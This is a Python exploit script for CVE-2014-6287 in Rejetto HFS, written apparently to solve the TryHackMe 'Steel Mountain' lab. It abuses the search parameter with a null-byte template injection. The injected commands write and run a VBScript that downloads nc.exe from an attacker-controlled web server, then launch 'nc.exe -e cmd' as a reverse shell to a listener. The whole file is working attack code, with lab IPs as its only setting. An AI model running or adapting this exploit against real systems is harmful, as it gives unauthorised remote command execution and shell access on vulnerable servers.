import urllib2 as url
import sys

# Solving TryHackMe "steelmountain" challenge, part 4.
#
# Initial exploit: https://www.exploit-db.com/exploits/39161
# Using updated version: https://github.com/roughiz/cve-2014-6287.py/blob/master/cve-2014-6287.py
#
# Contribution:
# - explicit the use of web & netcat ip/port
# - use int0x33 netcat version
#
# Netcat version used
# https://github.com/int0x33/nc.exe/blob/master/nc.exe


# Target
rhost = "10.10.80.20"
rport = "8080"
# Web server (nc.exe provider)
host_www = "10.10.75.5"
port_www = "8099"
# Netcat listener
host_nc = "10.10.75.5"
port_nc = "4545"

vb_script="C:\\Users\\Public\\script.vbs"
nc_path="C:\\Users\\Public\\nc.exe"
download_url="http://{host_www}:{port_www}/nc.exe".format(host_www=host_www, port_www=port_www)

save_vb_script ='''save|{vb_script}|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "{download_url}", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "{nc_path}", 2 '//overwrite
end with'''.format(vb_script=vb_script, download_url=download_url, nc_path=nc_path)
download_netcat = "exec|cscript.exe "+vb_script
run_netcat = "exec|{nc_path} -v {host_nc} {port_nc} -e cmd".format(nc_path=nc_path, host_nc=host_nc, port_nc=port_nc)

try:
  # download nc
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(save_vb_script) + ".}")

  #execute_script
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(download_netcat) + ".}")

  #nc_run():
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(run_netcat) + ".}")
except:
  print "[-] Something went wrong..!"
  sys.exit(-1)